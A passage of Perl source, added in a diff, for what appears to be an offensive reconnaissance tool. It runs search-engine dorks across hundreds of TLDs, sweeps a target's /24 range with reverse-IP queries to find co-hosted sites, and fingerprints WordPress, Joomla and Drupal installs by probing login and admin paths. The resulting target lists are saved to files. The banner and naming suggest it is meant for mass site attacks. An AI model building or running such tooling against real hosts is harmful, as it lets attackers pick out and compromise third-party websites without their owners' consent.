+@domains= ("gov","edu","com","net","af","al","dz","as","ad","ao","ai","aq","ag","ar","am","aw","au","at","az","bs","bh","bd","bb","by","be","bz","bj","bm","bt","bo","ba","bw","bv","br","io","bn","bg","bf","bi","kh","cm","ca","cv","ky","cf","td","cl","cn","cx","cc","co","km","cg","cd","ck","cr","ci","hr","cy","cz","dk","dj","dm","do","tl","ec","eg","sv","gq","er","ee","et","fk","fo","fj","fi","fr","gf","pf","tf","ga","gm","ge","de","gh","gi","gr","gl","gd","gp","gu","gt","gn","gw","gy","ht","hm","hn","hk","hu","is","in","id","iq","ie","il","it","jm","jp","jo","kz","ke","ki","kw","kg","la","lv","lb","ls","lr","ly","li","lt","lu","mo","mk","mg","mw","my","mv","ml","mt","mh","mq","mr","mu","yt","mx","fm","md","mc","mn","ms","ma","mz","na","nr","np","nl","an","nc","nz","ni","ne","ng","nu","nf","mp","no","om","pk","pw","ps","pa","pg","py","pe","ph","pn","pl","pt","pr","qa","re","ro","ru","rw","kn","lc","vc","ws","sm","st","sa","sn","cs","sc","sl","sg","sk","si","sb","so","za","gs","kr","es","lk","sh","pm","sr","sj","sz","se","ch","tw","tj","tz","th","tg","tk","to","tt","tn","tr","tm","tc","tv","ug","ua","ae","gb","us","um","uy","uz","vu","va","ve","vn","vg","vi","wf","eh","ye","zm","zw","info","tv","travel","biz","mobi","tel","int","mil","eu","design","online","shop","clup","asia","academy","accountant","accountants","actor","adult","ae.org","africa","agency","apartement","com.ar","archi","art","associates","attorney","com.au","id.au","net.au","org.au","auction","band","bar","bargains","bayern","beer","berlin","best","bet","bid","bike","bingo","bio","biz","black","blog","blue","boutique","br.com","brussels","build","buiders","business","buzz","cab","cafe","cam","camera","camp","capetown","capital","cards","care","career","careers","casa","cash","casino","catering","center","chat","cheap","church","city","claims","cleaning","click","clinic","clothing","cloud","cn.com","co.uk","coach","codes","coffee","college","community","company","computer","construction","consulting","contractors","cooking","cool","country","coupons","courses","credit","cricket","cruises","dance","date","dating","deals","degree","delivery","democrat","dental","dentist","diamonds","digital","direct","directory","discount","doctor","dog","domains","durban","download","earth","eco","education","email","energy","engineer","engineering","enterprises","equipment","estate","eu.com","events","exchange","expert","exposed","express","fail","faith","family","fans","farm","fashion","finance","finance","financial","fish","fishing","fit","fitness","flights","florist","fm","football","forsale","foundation","fun","fund","furniture","futbol","fyi","gallery","games","garden","gift","gifts","gives","glass","global","gold","golf","graphics","gratis","green","gripe","group","guide","guru","hamburg","haus","health","healthcare","help","hockey","holiday","horse","hospital","host","house","how","ht","immo","immobilien","industries","ink","institute","insure","international","investments","jetzt","jewelry","joburg","jpn.com","kaufen","kim","kitchen","kiwi","koeln","kyoto","land","lat","lawyer","lease","legal","lgbt","life","lighting","limited","limo","link","live","loan","loans","lol","london","love","ltd","maison","management","marketing","mba","media","melbourne","men","menu","miami","mobi","moda","moe","mom","money","mortgage","nagoya","name","network","news","ngo","ninja","nyc","ac.nz","org.nz","kiwi.nz","net.nz","school.nz","gen.nz","geen.nz","co.nz","maori.nz","okinawa","one","onl","organic","osaka","paris","partners","parts","party","pet","photo","photography","photos","pics","pictures","pink","pizza","place","plumbing","plus","poker","porn","press","pro","productions","promo","properties","pub","qpon","quebec","racing","recipes","red","rehab","reise","reisen","rent","rentals","repair","report","republican","rest","restaurant","review","reviews","rip","rocks","rodeo","ru.com","run","ryukyu","sa.com","sale","salon","sarl","com.sb","school","schule","science","scot","services","sexy","com.sg","shiksha","shoes","shopping","show","singles","site","ski","soccer","social","software","solar","solutions","soy","space","stop","store","stream","studio","study","style","supplies","supply","support","sure","surgery","sydney","systems","taipei","tattoo","tax","taxi","team","tech","technology","tel","tennis","theater","tienda","tips","tires","today","tokyo","tools","top","tours","town","toys","trade","trading","training","tube","org.uk","me.uk","uk.com","university","uno","us.com","vacations","vc","vegas","ventures","vet","viajes","video","villas","vin","vip","vision","vlaanderen","vodka","vote","voting","voyage","wales","wang","watch","webcam","website","wedding","wf","wien","wiki","win","wine","work","works","world","wtf","??","??","???","???","?????","??","???","??","??","??","XYZ","YOGA","yokohama","yt","co.za","za.com","zone");
+
+OUTER: foreach $domains(@domains){
+chomp $domains;
+$dork="$dor+site:$domains";
+print color("red"),"ur scan is for [ ";
+print color('reset');
+print color("green"),"$domains ]\n";
+print color('reset');
+THE();
+}
+}
+if ($toolZ eq '7')
+{
+Into();
+}
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+sub gettt()
+{
+
+$ip= (gethostbyname($tofuck))[4];
+my ($a,$b,$c,$d) = unpack('C4',$ip);
+$ips="$a.$b.$c.$d";
+print " [IP] > [$ips]\n";
+        open (TEXT, '>>ips.txt');
+        print TEXT "$ips\n";
+        close (TEXT);
+$dork="ip:$ips";
+THE();
+}
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+sub gett()
+{
+$ip= (gethostbyname($tofuck))[4];
+my ($a,$b,$c,$d) = unpack('C4',$ip);
+for ($i = 1; $i <= 255; $i+=1){
+$ips ="$a.$b.$c.$i";
+OUTER: foreach $ip($ips){
+print color("red"), " [IP] > [$ips]\n";
+print color ('reset');
+        open (TEXT, '>>ips.txt');
+        print TEXT "$ips\n";
+        close (TEXT);
+$dork="ip:$ips";
+THE();
+}
+}
+}
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+sub crew
+{
+for ($ii = 1; $ii <= 2000; $ii+=10){
+
+$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
+$resp = $ag->request(HTTP::Request->new(GET => $url));
+$rrs = $resp->content;
+
+while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){
 
 
 
+$link = $1;
+	if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
+	{
+				if ($link !~ /^http:/)
+			 {
+				$link = 'http://' . "$link" . '/';
+			 }
 
 
+
+if($link !~ /\"|\?|\=|index\.php/){
+					if  (!  grep (/$link/,@result))
+					{
+print "$link\n";
+open(save, '>>sites-2.txt');
+    print save "$link\n";
+	print "saved at target/sites-2.txt";
+    close(save);
+						push(@result,$link);
+}
+} 
+}
+}
+####
+if ($rrs !~ m/class=\"sb_pagN\"/g){
+exit;
+}
+}
+}
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+sub THE
+{
+for ($ii = 1; $ii <= 2000; $ii+=10){
+
+$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
+$resp = $ag->request(HTTP::Request->new(GET => $url));
+$rrs = $resp->content;
+
+while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){
+
+
+
+$link = $1;
+	if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
+	{
+				if ($link !~ /^http:/)
+			 {
+				$link = 'http://' . "$link" . '/';
+			 }
+
+
+
+if($link !~ /\"|\?|\=|index\.php/){
+					if  (!  grep (/$link/,@result))
+					{
+print "$link\n";
+open(save, '>>target/sites-1.txt');
+    print save "$link\n";
+    close(save);
+						push(@result,$link);
+					}
+} 
+}
+}
+####
+if ($rrs !~ m/class=\"sb_pagN\"/g){
+next OUTER;
+}
+}
+	print "saved at target/sites-1.txt";
+
+}
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+sub Into
+{
+system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+$logo="
+                      .                                                      .
+                    .n                   .                 .                  n.
+              .   .dP                  dP                   9b                 9b.    .
+             4    qXb         .       dX                     Xb       .        dXp     t
+            dX.    9Xb      .dXb    __       [Ph.Hitachi]      __    dXb.     dXP     .Xb
+            9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
+             9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+              `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
+                `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
+                    ~~~~~~~       9X.    0     .db|db.     0    .XP       ~~~~~~~
+                                   8b.     .dbodP'89b.odb.     .d8
+                                  ,dXXXXXXXXXXXb  8  dXXXXXXXXXXXb.
+                                 dXXXXXXXXXXXP'   8   '9XXXXXXXXXXXb
+                                dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+                                9XXbXXXXXb.dX     |     Xb.dXXXXXdXXP
+                                         9XXXXXX(___)XXXXXXP      
+                                        xXXXXX X.'v'.X XXXXXx
+                                            XXXbb   ddXXX
+                                           x.X         X.x
+                                          b'             'd      
+
+";
+print color("green"),$logo;
+print color("green" ), "\t   [";print color("red"),"1";print color("green"),"]extract WORDPRESS sites ^^\n";
+print color("green" ), "\t   [";print color("red"),"2";print color("green"),"]extract JOOMLA sites ^^\n";
+print color("green" ), "\t   [";print color("red"),"3";print color("green"),"]extract DRUPAL sites ^^\n";
+print color("green" ), "\t   [";print color("red"),"4";print color("green"),"]extract VBULLETIN sites ^^\n";
+print color("green" ), "\t   [";print color("red"),"5";print color("green"),"]extract ALL the server sites ^^\n";
+print color("green" ), "\t   [";print color("red"),"6";print color("green"),"]GO_BACK \n";
+print color("green"),"[+] Choose Number : ";
+	$choice1 = <stdin>;
+	chomp ($choice1);
+	if ($choice1 eq "1")
+	{
+		print "\nExtract Wordpress sites...\n";
+		print "==============================\n";
+		IP_id();
+		print "Searching for Wordpress sites..\n";
+		WPS();
+		$n_found = $#WPS+1;
+		print "\t>> Found $n_found Wordpress sites\n\n";
+		print "Do you want to save the result [Y\n]: ";
+		$save = <stdin>;
+		chomp($save);
+		if ($save eq "Y" or $save eq "" or $save eq "y")
+		{
+			open(TEXT, ">Extract/WordPress.txt");
+			map {$_ = "$_\n"} (@WPS);
+			print TEXT @WPS;
+		print "\t>> Saved at Extract/WordPress.txt\n";
+		}
+	}
+	elsif ($choice1 eq "2") 
+	{
+		print "\nExtract Joomla sites...\n";
+		print "==============================\n";
+		print "Do you want to extract all Joomla Sites or V1.5 only ?\n";
+		print "(ALL\\1.5): ";
+		$choice2 = <stdin>;
+		chomp($choice2);
+		if ($choice2 eq "all" or $choice2 eq "ALL" or $choice2 eq "")
+		{
+			IP_id();
+			print "Searching for Joomla sites...\n";
+			Joomla();
+			$n_found = $#JM+1;
+			print "\t>> Found $n_found Joomla sites\n\n";
+			print "Do you want to save the result [Y\n]: ";
+			$save = <stdin>;
+			chomp($save);
+			if ($save eq "Y" or $save eq "" or $save eq "y")
+			{
+				open(joomsite, ">Extract/Joomla.txt");
+				map {$_ = "$_\n"} (@JM);
+				print joomsite @JM;
+				print "\t>> Saved at Extract/Joomla.txt\n";
+			}
+		}
+		elsif ($choice2 eq "1.5")
+		{
+			IP_id();
+			print "Searching for Joomla 1.5 sites\n";
+			Joomla15();
+			$n_found = $#JM+1;
+			print "\t>> Found $n_found Joomla 1.5 sites\n\n";
+			print "Do you want to save the result [Y\n]: ";
+			$save = <stdin>;
+			chomp($save);
+			if ($save eq "Y" or $save eq "" or $save eq "y")
+			{
+				open(joomsite, ">Extract/Joomla.txt");
+				map {$_ = "$_\n"} (@JM);
+				print joomsite @JM;
+				print "\t>> Saved at Extract/Joomla.txt\n";
+			}
+		}
+		else
+		{
+			print "Unknown Choice !!\nExiting...\n";
+			exit;
+		}
+			
+	}
+	elsif ($choice1 eq "d" or $choice1 eq "D" or $choice1 eq "3")
+	{
+		print "\nExtract Drupal sites...\n";
+		print "==============================\n";
+		print "Do you want to extract all Drupal version or sites with specific version\n";
+		print "(all? Y\\n): ";
+		$choice3 = <stdin>;
+		chomp ($choice3);
+		if ($choice3 eq "n" or $choice3 eq "N")
+		{
+			print "(version?):" ;
+			$ver = <stdin>;
+			chomp ($ver);
+			IP_id();
+			print "Searching for Drupal $ver sites\n";
+			DRV();
+                        $n_found = $#DS+1;
+                        print "\t>> Found $n_found Drupal sites\n\n";
+                        print "Do you want to save the result [Y\n]: ";
+                        $save = <stdin>;
+                        chomp($save);
+                        if ($save eq "Y" or $save eq "" or $save eq "y")
+                        {
+                                open(drupsite,">Extract/DrupalSites$ver.txt");
+                                map {$_ = "$_\n"} (@DS);
+                                print drupsite @DS;
+                                print "\t>> Saved at Extract/DrupalSites$ver.txt\n";
+                        }
+		}
+		elsif ($choice3 eq "Y" or $choice3 eq "y" or $choice3 eq "")
+		{
+			IP_id();
+			print "Searching for Drupal sites\n";
+			searchdrupal();
+			$n_found = $#DS+1;
+			print "\t>> Found $n_found Drupal sites\n\n";
+			print "Do you want to save the result [Y\n]: ";
+			$save = <stdin>;
+			chomp($save);
+			if ($save eq "Y" or $save eq "" or $save eq "y")
+			{
+				open(drupsite,">Extract/Drupal.txt");
+				map {$_ = "$_\n"} (@DS);
+				print drupsite @DS;
+				print "\t>> Saved at Extract/Drupal.txt\n";
+			}
+			
+		}
+	}
+
+	elsif ($choice1 eq "5")
+	{
+		print "\nExtract Wordpress & Joomla & Drupal sites...\n";
+		print "====================================================\n";
+		IP_id();
+		print "\nSearching for Wordpress sites\n";
+		print "---------------------------------\n";
+		WPS();
+		$n_found = $#WPS+1;
+		print "\t>> Found $n_found Wordpress sites\n";
+		open(wordpress, ">Extract/Wordpress.txt");
+		map {$_ = "$_\n"} (@WPS);
+		print wordpress @WPS;
+		print "\t>> Saved at Extract/Wordpress.txt\n\n";
+
+		print "\nSearching for Joomla sites\n";
+		print "------------------------------\n";
+		Joomla();
+		$n_found = $#JM+1;
+		print "\t>> Found $n_found Joomla sites\n";
+		open(joomla, ">Extract/Joomla.txt");
+		map {$_ = "$_\n"} (@JM);
+		print joomla @JM;
+		print "\t>> Saved at Extract/Joomla.txt\n\n";
+
+		print "\nSearching for Drupal sites\n";
+		print "-----------------------------\n";
+		searchdrupal();
+		$n_found = $#DS+1;
+		print "\t>> Found $n_found Drupal sites\n";
+		open(drupal,">Extract/Drupal.txt");
+		map {$_ = "$_\n"} (@DS);
+		print drupal @DS;
+		print "\t>> Saved at Extract/Drupal.txt\n";
+	}
+	elsif ($choice1 eq "4")
+	{
+		print "\nExtract Server sites\n";
+		print "========================\n";
+		IP_id();
+		map {$_ = "$_\n"} (@result);
+		print @result;
+		print "Do you want to save the result [Y\n]: ";
+		$save = <stdin>;
+		chomp($save);
+		if ($save eq "Y" or $save eq "" or $save eq "y")
+		{
+			open(sites, ">Extract/Sites.txt");
+			print sites @result;
+			print "\t>> Saved at Extract/Sites.txt\n";
+		}
+
+	}
+}
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+sub IP_id
+ {
+	print "Enter the IP of the server or a site hosted on the same server\n";
+	print ">> ";
+	$input =<stdin>;
+	chomp($input);
+	if ($input =~ m/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/)
+	{
+		$ip = $input;
+		print "Collecting the sites...\n";
+		getSites();
+	}
+	elsif ($input =~ m/\D/g)
+	{
+		if ($input =~ m/https:\/\//)
+		{
+			$source = substr($input,8,length($input));
+			print "Site : $source\n";
+			print "Getting IP Adress...\n";
+                        $ip = inet_ntoa(inet_aton($source));
+                        print "IP: $ip\n";
+			print "Collecting the sites...\n";
+			getSites();
+		}
+                elsif ($input =~ m/http:\/\//)
+                {
+                        $source = substr($input,7,length($input));
+                        print "Site : $source\n";
+			print "Getting IP Adress...\n";
+                        $ip = inet_ntoa(inet_aton($source));
+                        print "IP: $ip\n";
+			print "Collecting the sites...\n";
+			getSites();
+
+                }
+		else 
+		{
+			print "Site : $input\n";
+			print "Getting IP Adress...\n";
+			$ip = inet_ntoa(inet_aton($input));
+			print "IP : $ip\n";
+			print "Collecting the sites...\n";
+			getSites();
+		}
+	}	
+}
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+sub Joomla15 
+{
+        foreach $site (@result)
+        {
+                $mech->get("$site");
+                $Scont = $mech->content;
+                if ($Scont =~ m/<meta name="generator" content="Joomla! 1.5 - Open Source Content Management" \/>/ig)
+                {
+                        push @JM,$site;
+                        print "$site\n";
+                }
+                else 
+                {
+                        $admin = "$site/administrator/";
+                        $mech->get("$site");
+                        $AdminCont = $mech->content;
+                        if ($AdminCont =~ m/<meta name="generator" content="Joomla! 1.5 - Open Source Content Management" \/>/ig)
+                        {
+                                push @JM,$site;
+                                print "$site\n";
+                        }
+                }
+        }
+}
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+sub Joomla 
+{
+	foreach $site (@result)
+	{
+		if  (!  grep (/$site/,@WPS))
+		{
+			$url = $mech->get("$site");
+			$Scont = $mech->content;
+			if ($Scont =~ m/<meta name="generator" content="Joomla!/ig)
+			{
+				push @JM,$site;
+				print "$site\n";
+			}
+			else 
+			{
+				$admin = "$site/administrator/";
+				$mech->get("$site");
+				$AdminCont = $mech->content;
+				if ($AdminCont =~ m/<meta name="generator" content="Joomla!/ig)
+				{
+					push @JM,$site;
+					print "$site\n";
+				}
+			}
+		}
+	}
+}
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+sub DRV 
+{
+        foreach $site (@result)
+        {
+                $mech->get("$site");
+                $Scont = $mech->content;
+                if ($Scont =~ m/<meta name="Generator" content="Drupal $ver/ig)
+                {
+                        push @DS,$site;
+                        print "$site\n";
+                }
+        }
+	
+}
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+sub searchdrupal 
+{
+	foreach $site (@result)
+	{
+		if  (!  grep (/$site/,@WPS) and ! grep(/$site/,@JM))
+		{
+			$mech->get("$site");
+			$Scont = $mech->content;
+			if ($Scont =~ m/<meta name="Generator" content="Drupal/ig)
+			{
+				push @DS,$site;
+				print "$site\n";
+			}
+		}
+	}
+}
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+sub WPS {
+	foreach $site (@result)
+	{
+		$url = $mech->get("$site");
+		$Scont = $mech->content;
+		if ($Scont =~ m/wp-content/g)
+		{
+			$license = $site."license.txt";
+			$horse = $mech->get("$license");
+			if ($horse->is_success)
+			{
+				$Scont = $mech->content;
+				$login = $site."wp-login.php";
+				$logUrl = $mech->get("$login");
+	 	                if ($Scont =~ m/WordPress/)     
+				{
+					push @WPS,$site;
+					print "$site\n";
+				}
+				elsif($logUrl->is_success) 
+				{
+					push @WPS,$site; 
+					print "$site\n";
+				}
+
+			}
+
+		}
+
+
+	}
+
+}
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+####################################################################################################################
+sub getSites {
+	for($count=10;$count<=1000;$count+=10)
+	{
+		$k++;
+		$url = "http://www.hotbot.com/search/web?pn=$k&q=ip%3A$ip&keyvol=01f9093871a6d24c0d94";
+		$url = "https://www.bing.com/search?q=ip%3a$ip&go=Submit+Query&qs=ds&first=$count&FORM=PERE$k";
+		$url = "https://www.bing.com/search?q=ip%3A$ip+&count=50&first=$count";
+		$resp = $ag->request(HTTP::Request->new(GET => $url));
+
+		$rrs = $resp->content;
+
+
+
+		while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g)
+		{
+	
+			$link = $1;
+		
+			if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
+			{
+				if ($link !~ /^http:/)
+				{
+					$link = 'http://' . "$link" . '/';
+				}
+	
+				if($link !~ /\"|\?|\=|index\.php/)
+				{
+					if  (!  grep (/$link/,@result))
+					{
+						push(@result,$link);
+					}
+				}
+			} 
+		}
+	}
+	$found = $#result + 1;
+	print "found $found sites\n";
+	
+}
+}
